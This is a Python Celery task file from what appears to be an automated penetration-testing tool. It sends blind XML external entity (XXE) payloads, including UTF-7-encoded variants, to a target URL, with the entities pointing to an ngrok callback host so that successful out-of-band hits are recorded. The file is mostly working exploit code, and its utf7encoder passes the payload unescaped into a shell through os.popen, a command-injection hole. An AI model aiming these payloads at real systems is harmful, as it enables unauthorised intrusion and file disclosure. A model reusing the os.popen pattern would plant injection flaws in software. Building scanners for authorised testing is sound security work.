from celery import shared_task
from pentest.helpers.utils import RequestWrapper, finishTest
from collections import OrderedDict
import xmltodict
import dicttoxml
import os
import re
from time import sleep
import requests
from pentest.models import Payload

def payload_inserter(d, payload):
    for k, v in d.items():
        if isinstance (v, OrderedDict):
            payload_inserter(v, payload)
        else:
            if d is not None:
                d[k] = payload

def utf7encoder(payload):
    result = os.popen(f'echo \'{payload}\' | iconv -f utf-8 -t utf-7').read().strip()
    return result

def getHTTPURL(url) :
    get_url = url.split(':')[1]
    http_url = "http:" + get_url
    return http_url

@shared_task
def XXETest(url, test_id, request_method, headers, data_format, body):

    r = requests.get("http://127.0.0.1:4040/api/tunnels")
    resp = r.json()
    ngrok_url = resp["tunnels"][0]["public_url"]
    ngrok_url = getHTTPURL(ngrok_url)

    print("ngrok_url", ngrok_url)
    body = xmltodict.parse(body)

    payloads = {
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "URLHERE">] >': "&xxe;",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE product [ <!ENTITY % xxe SYSTEM "URLHERE"> %xxe;]>': None,
        '<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "URLHERE">] >' : "&xxe;",
        '<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE product [ <!ENTITY % xxe SYSTEM "URLHERE"> %xxe;]>': None
    }

    for (header, payload) in payloads.items():
        # build the url for the malicious xml header
        try:
            pl_id = Payload.objects.last().id+1
        except:
            pl_id = 1
        xxe_url = ngrok_url + '/xxecapturer/' + str(pl_id)
        header = re.sub("URLHERE", xxe_url, header)

        # replace xml values in body
        current_body = body
        payload_inserter(current_body, payload)
        current_body = dicttoxml.dicttoxml(current_body, attr_type=False, root=False)
        current_body = re.sub("&amp;", "&", current_body.decode())

        # combine malicious xml header and body
        current_body = header + current_body
        
        # utf7 payload modifications
        if "UTF-7" in current_body :
            utf_7_header = current_body.split('UTF-7"?>')[0].strip()
            raw_payload = current_body.split('UTF-7"?>')[1].strip()
            encoded_payload = utf7encoder(raw_payload)
            current_body = utf_7_header + "UTF-7\"?>" + encoded_payload

        print("current_body nih", current_body)

        # send the request
        req = RequestWrapper(url, request_method, headers, data_format, str(current_body))
        req.saveRequestAsPayload("XXE IN PROGRESS", test_id)
        print("response bodi nih", req.request.text)
        sleep(10)

    xxe_payload = Payload.objects.filter(test_id=test_id)

    for p in xxe_payload :
        if p.payload_string == "XXE IN PROGRESS" :
            Payload.objects.filter(pk=p.id).delete()
    finishTest(test_id)

@shared_task
def XXEHandler(payload_id):
    while True:
        try:
            payload = Payload.objects.get(pk=payload_id)
            payload.payload_string = "XXE Successful"
            payload.save()
            break
        except Exception as e :
            print("e nih", e)
            sleep(1)  